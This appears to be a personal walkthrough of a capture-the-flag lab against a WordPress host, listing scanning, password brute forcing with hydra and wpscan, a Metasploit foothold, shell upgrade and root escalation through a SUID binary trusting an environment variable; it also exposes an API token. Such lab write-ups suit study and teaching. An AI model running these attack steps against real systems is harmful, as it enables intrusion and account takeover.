export ip=10.10.166.125

# Recon and Scanning
## nmap
- `sudo nmap -sC -sV -O -oG nmap.log $ip`
  - 22, 80, 139, 445
  - windows 6
  - Samba 4.7.6

## enum4linux
- `enum4linux -a $ip | tee enum4linux.log`
  - users `bjoel`

## nikto
- `nikto -h $ip | tee nikto.log`
  - wp-admin
  - robot.txt

## hydra
- `hydra -l bjoel -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt $ip http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.166.125%2Fwp-admin%2F&testcookie=1:ERROR"`

## gobuster
- `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://blog.thm | tee gobuster.log`
  - /0

## wpscan
- `wpscan --url blog.thm --api-token cTQl41a8f7FOZWK5BeYRxF63bh4p8N1NpthAgJa6o5g -P /usr/share/wordlists/rockyou.txt -U 'bjoel'`
  - no luck
- `wpscan --url blog.thm --api-token cTQl41a8f7FOZWK5BeYRxF63bh4p8N1NpthAgJa6o5g --enumerate u`
  - 2 users, bjoel and kwheel
- `wpscan --url blog.thm --api-token cTQl41a8f7FOZWK5BeYRxF63bh4p8N1NpthAgJa6o5g -P /usr/share/wordlists/rockyou.txt -U 'kwheel'`
  - got the password

# process
- Opened the ip address in the browser as http service is running
- from the nikto log it was apparent that the site is running wordpress
- checked the robots.txt it had 2 entries, one `wp-admin` and `/wp-admin/admin-ajax.php`. the second one is unusual.
- from the enum4linux we saw a username, so tried that with wp login page and found that the username exists as the error message makes it obvious
- also enum4linux showed a share `/BillySMB` which we can map, so trying that.
- downloaded all the files
  - qr code lead to a billy joel song
  - png image was a image with txt file isnide it, but the text was a placeholder
    - `steghide extract -sf Alice-White-Rabbit.jpg` - no password
- we got the password from wpscan for an author, but as per wpscan's report we have at least one vulnerability we can make use of to get into the system.
- using metasploit I was able to get a meterpreter session
  - ran the below commands to get a better shell
    - `shell`
    - `python -c 'import pty;pty.spawn("/bin/bash")'`
  - checked for files with SUID set
    - `find / -perm -u=s -type f 2>/dev/null`
    - and found one file called `checker` which I was not sure what actually does
    - tried to execute it and it just said, not an admin
    - So used ltrace to see whats happening behind the screen, and found it was actually getting the env variable called `admin`.
    - So I thought of settting it to some value
      - export admin=true
    - executed the checker file again and suddenly I had root shell :D
  - went to the home dir of root where I got the first flag
  - cms name and version was found out from wpscan results.
  - Now all that's left are the user.txt content and the location.
  - from the question it is apparent that first part of the location of user.txt has five characters. So cd into `/` and go through all the plausible directories. I tried `/media` first where I found `usb` directory under which user.txt was found.